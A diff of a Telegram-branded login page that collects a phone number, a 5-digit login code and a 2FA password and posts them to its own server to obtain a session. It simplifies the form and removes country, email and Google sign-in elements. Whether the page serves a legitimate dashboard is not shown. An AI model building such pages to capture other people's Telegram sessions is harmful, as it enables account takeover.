@@ -89,21 +89,7 @@
             line-height: 1.5;
         }
 
-        /* Form elements */
-        .form-group {
-            margin-bottom: 24px;
-        }
-
-        .form-label {
-            display: block;
-            color: #8e9fad;
-            font-size: 0.85rem;
-            font-weight: 500;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 8px;
-        }
-
+        /* Input wrapper */
         .input-wrapper {
             background: #242f3d;
             border: 1px solid #2b3945;
@@ -112,6 +98,7 @@
             align-items: center;
             overflow: hidden;
             transition: all 0.2s;
+            margin-bottom: 24px;
         }
 
         .input-wrapper:focus-within {
@@ -119,14 +106,15 @@
             box-shadow: 0 0 0 2px rgba(76, 156, 224, 0.2);
         }
 
-        .country-code-prefix {
+        .input-prefix {
             padding: 14px 0 14px 16px;
             color: #8e9fad;
             font-weight: 500;
             font-size: 1rem;
             background: #1e2a36;
             border-right: 1px solid #2b3945;
-            min-width: 60px;
+            min-width: 50px;
+            text-align: center;
         }
 
         .form-input {
@@ -143,54 +131,27 @@
             color: #5d6f7e;
         }
 
-        /* Country selector */
-        .country-selector {
+        /* Password input */
+        .password-input {
+            width: 100%;
+            padding: 14px 16px;
             background: #242f3d;
             border: 1px solid #2b3945;
             border-radius: 12px;
-            padding: 14px 16px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            cursor: pointer;
-            transition: all 0.2s;
-            margin-bottom: 16px;
-        }
-
-        .country-selector:hover {
-            background: #2b3945;
-        }
-
-        .country-info {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .country-flag {
-            width: 24px;
-            height: 24px;
-            border-radius: 50%;
-            background: #2b5278;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 0.8rem;
-        }
-
-        .country-name {
             color: #fff;
-            font-weight: 500;
+            font-size: 1rem;
+            outline: none;
+            transition: all 0.2s;
+            margin-bottom: 24px;
         }
 
-        .country-code {
-            color: #8e9fad;
+        .password-input:focus {
+            border-color: #4c9ce0;
+            box-shadow: 0 0 0 2px rgba(76, 156, 224, 0.2);
         }
 
-        .dropdown-arrow {
-            color: #8e9fad;
-            font-size: 1.2rem;
+        .password-input::placeholder {
+            color: #5d6f7e;
         }
 
         /* Code input boxes */
@@ -213,16 +174,12 @@
             text-align: center;
             line-height: 65px;
             transition: all 0.2s;
+            cursor: pointer;
         }
 
         .code-box.filled {
             border-color: #4c9ce0;
             background: #2b5278;
-        }
-
-        .code-box:focus {
-            outline: none;
-            border-color: #4c9ce0;
         }
 
         .hidden-input {
@@ -233,86 +190,7 @@
             pointer-events: none;
         }
 
-        /* Email display */
-        .email-display {
-            background: #242f3d;
-            border: 1px solid #2b3945;
-            border-radius: 12px;
-            padding: 16px;
-            margin-bottom: 16px;
-            color: #fff;
-            font-weight: 500;
-            word-break: break-all;
-        }
-
-        .email-display small {
-            display: block;
-            color: #8e9fad;
-            font-size: 0.85rem;
-            margin-top: 4px;
-            font-weight: normal;
-        }
-
-        .cant-access {
-            color: #4c9ce0;
-            text-decoration: none;
-            font-size: 0.9rem;
-            display: inline-block;
-            margin: 8px 0 16px;
-            cursor: pointer;
-        }
-
-        .cant-access:hover {
-            text-decoration: underline;
-        }
-
-        .divider {
-            display: flex;
-            align-items: center;
-            text-align: center;
-            color: #8e9fad;
-            font-size: 0.9rem;
-            margin: 24px 0;
-        }
-
-        .divider::before,
-        .divider::after {
-            content: '';
-            flex: 1;
-            border-bottom: 1px solid #2b3945;
-        }
-
-        .divider span {
-            padding: 0 10px;
-        }
-
-        .google-btn {
-            width: 100%;
-            padding: 14px;
-            background: #242f3d;
-            border: 1px solid #2b3945;
-            border-radius: 12px;
-            color: #fff;
-            font-size: 1rem;
-            font-weight: 500;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            cursor: pointer;
-            transition: all 0.2s;
-            margin-bottom: 24px;
-        }
-
-        .google-btn:hover {
-            background: #2b3945;
-        }
-
-        .google-btn svg {
-            width: 20px;
-            height: 20px;
-        }
-
+        /* Buttons */
         .btn {
             width: 100%;
             padding: 14px;
@@ -326,7 +204,7 @@
             align-items: center;
             justify-content: center;
             gap: 8px;
-            margin-top: 24px;
+            margin-top: 16px;
         }
 
         .btn-primary {
@@ -353,6 +231,7 @@
             background: #3a4a5a;
         }
 
+        /* Error message */
         .error-message {
             background: #8e2b2b;
             color: white;
@@ -367,6 +246,7 @@
             display: block;
         }
 
+        /* Loading spinner */
         .loading-spinner {
             display: inline-block;
             width: 20px;
@@ -381,21 +261,7 @@
             to { transform: rotate(360deg); }
         }
 
-        .footer-link {
-            text-align: center;
-            margin-top: 24px;
-        }
-
-        .footer-link a {
-            color: #4c9ce0;
-            text-decoration: none;
-            font-size: 0.9rem;
-        }
-
-        .footer-link a:hover {
-            text-decoration: underline;
-        }
-
+        /* Resend timer */
         .resend-timer {
             color: #8e9fad;
             font-size: 0.9rem;
@@ -411,6 +277,22 @@
             cursor: pointer;
             text-decoration: underline;
             margin-top: 8px;
+        }
+
+        /* Footer link */
+        .footer-link {
+            text-align: center;
+            margin-top: 24px;
+        }
+
+        .footer-link a {
+            color: #4c9ce0;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        .footer-link a:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
@@ -430,25 +312,13 @@
 
                 <div class="step-title">Your phone number</div>
                 <div class="step-description">
-                    Please confirm your country code and enter your phone number.
+                    Please enter your phone number with country code.
                 </div>
 
-                <!-- Country Selector -->
-                <div class="country-selector" onclick="selectCountry()">
-                    <div class="country-info">
-                        <div class="country-flag">🇺🇸</div>
-                        <span class="country-name">United States</span>
-                        <span class="country-code">+1</span>
-                    </div>
-                    <span class="dropdown-arrow">▼</span>
-                </div>
-
-                <!-- Phone Input -->
-                <div class="form-group">
-                    <div class="input-wrapper">
-                        <span class="country-code-prefix" id="countryCodeDisplay">+1</span>
-                        <input type="tel" class="form-input" id="phone" placeholder="Phone number" inputmode="numeric" pattern="[0-9]*" value="">
-                    </div>
+                <!-- Single phone input with + prefix -->
+                <div class="input-wrapper">
+                    <span class="input-prefix">+</span>
+                    <input type="tel" class="form-input" id="phone" placeholder="1234567890" inputmode="numeric" value="">
                 </div>
 
                 <button class="btn btn-primary" id="sendCodeBtn" onclick="sendCode()">
@@ -467,33 +337,10 @@
                     <div class="header-title">Telegram</div>
                 </div>
 
-                <div class="step-title">Check Your Email</div>
+                <div class="step-title">Enter Code</div>
                 <div class="step-description">
-                    Please enter the code we have sent to your email <strong id="emailDisplay">mr3@gmail.com</strong>.
+                    Please enter the 5-digit code sent to your phone.
                 </div>
-
-                <!-- Email display -->
-                <div class="email-display" id="emailContainer">
-                    <span id="emailAddress">mr3@gmail.com</span>
-                    <small>Check your inbox for the code</small>
-                </div>
-
-                <div class="cant-access" onclick="cantAccessEmail()">Can't access this email?</div>
-
-                <div class="divider">
-                    <span>or</span>
-                </div>
-
-                <!-- Google Sign In -->
-                <button class="google-btn" onclick="googleSignIn()">
-                    <svg viewBox="0 0 24 24">
-                        <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
-                        <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
-                        <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
-                        <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
-                    </svg>
-                    Sign in with Google
-                </button>
 
                 <!-- Hidden input for code -->
                 <input type="text" id="hiddenCodeInput" class="hidden-input" maxlength="5" inputmode="numeric" pattern="[0-9]*">
@@ -507,12 +354,9 @@
                     <div class="code-box" id="box5">-</div>
                 </div>
 
-                <!-- 2FA Password Input -->
-                <div class="form-group" id="passwordGroup" style="display: none;">
-                    <div class="form-label">Two-Factor Authentication</div>
-                    <div class="input-wrapper">
-                        <input type="password" class="form-input" id="password" placeholder="Enter your 2FA password">
-                    </div>
+                <!-- 2FA Password Input (hidden by default) -->
+                <div id="passwordGroup" style="display: none;">
+                    <input type="password" class="password-input" id="password" placeholder="Enter your 2FA password">
                 </div>
 
                 <!-- Next Button -->
@@ -549,6 +393,10 @@
                     </button>
                 </div>
             </div>
+
+            <div class="footer-link">
+                <a href="/dashboard">← Back to Dashboard</a>
+            </div>
         </div>
     </div>
 
@@ -557,7 +405,6 @@
         let timeLeft = 60;
         let currentSessionId = null;
         let currentPhone = '';
-        let currentCountryCode = '+1';
 
         // DOM elements
         const hiddenInput = document.getElementById('hiddenCodeInput');
@@ -575,6 +422,8 @@
             errorDiv.className = 'error-message show';
             errorDiv.textContent = message;
             
+            // Find which step is visible
+            const visibleStep = document.querySelector('#step1:visible, #step2:visible, #step3:visible');
             const step2 = document.getElementById('step2');
             step2.insertBefore(errorDiv, step2.firstChild);
             
@@ -631,10 +480,10 @@
                 }
             }
             
-            // Auto verify when 5 digits entered
-            if (code.length === 5) {
-                setTimeout(() => verifyCode(), 300);
-            }
+            // Auto verify when 5 digits entered (optional - remove if you want manual only)
+            // if (code.length === 5) {
+            //     setTimeout(() => verifyCode(), 300);
+            // }
         }
 
         // Hidden input event listeners
@@ -648,47 +497,19 @@
             window.location.href = '/dashboard';
         }
 
-        function selectCountry() {
-            // In a real app, this would open a country selector
-            // For now, just cycle through a few countries
-            const countries = [
-                { name: 'United States', code: '+1', flag: '🇺🇸' },
-                { name: 'United Kingdom', code: '+44', flag: '🇬🇧' },
-                { name: 'India', code: '+91', flag: '🇮🇳' },
-                { name: 'UAE', code: '+971', flag: '🇦🇪' }
-            ];
-            
-            const currentIndex = countries.findIndex(c => c.code === currentCountryCode);
-            const nextIndex = (currentIndex + 1) % countries.length;
-            const country = countries[nextIndex];
-            
-            currentCountryCode = country.code;
-            document.querySelector('.country-name').textContent = country.name;
-            document.querySelector('.country-code').textContent = country.code;
-            document.querySelector('.country-flag').textContent = country.flag;
-            document.getElementById('countryCodeDisplay').textContent = country.code;
-        }
-
-        function cantAccessEmail() {
-            showError('Please check your email spam folder or request a new code');
-        }
-
-        function googleSignIn() {
-            showError('Google Sign-In is not available in this demo');
-        }
-
         // Send verification code
         async function sendCode() {
-            const phoneInput = document.getElementById('phone');
-            let phoneNumber = phoneInput.value.trim().replace(/\s+/g, '');
+            let phoneNumber = document.getElementById('phone').value.trim().replace(/\s+/g, '');
             
             if (!phoneNumber) {
                 showError('Please enter your phone number');
                 return;
             }
 
-            // Combine country code with phone number
-            const fullPhone = currentCountryCode + phoneNumber;
+            // Ensure phone has + prefix
+            if (!phoneNumber.startsWith('+')) {
+                phoneNumber = '+' + phoneNumber;
+            }
 
             const button = document.getElementById('sendCodeBtn');
             setLoading(button, true);
@@ -699,21 +520,18 @@
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({ phone: fullPhone })
+                    body: JSON.stringify({ phone: phoneNumber })
                 });
 
                 const data = await response.json();
 
                 if (data.success) {
                     currentSessionId = data.session_id;
-                    currentPhone = fullPhone;
+                    currentPhone = phoneNumber;
                     
                     // Show step 2
                     document.getElementById('step1').style.display = 'none';
                     document.getElementById('step2').style.display = 'block';
-                    
-                    // Set email display (in a real app, this would be the user's email)
-                    document.getElementById('emailAddress').textContent = 'user@gmail.com';
                     
                     // Clear and focus hidden input
                     hiddenInput.value = '';
@@ -743,6 +561,12 @@
             }
 
             const password = document.getElementById('password').value;
+            const needPassword = document.getElementById('passwordGroup').style.display === 'block';
+
+            if (needPassword && !password) {
+                showError('Please enter your 2FA password');
+                return;
+            }
 
             const button = document.getElementById('verifyBtn');
             setLoading(button, true);
@@ -870,11 +694,12 @@
         }
 
         function goToDashboard() {
-            window.location.href = '/home';
+            window.location.href = '/dashboard';
         }
 
         // Event listeners
         document.getElementById('phone').addEventListener('input', function(e) {
+            // Allow only numbers
             this.value = this.value.replace(/[^0-9]/g, '');
         });
 
@@ -896,6 +721,9 @@
                 hiddenInput.focus();
             }
         });
+
+        // Initialize
+        document.getElementById('phone').focus();
     </script>
 </body>
 </html>
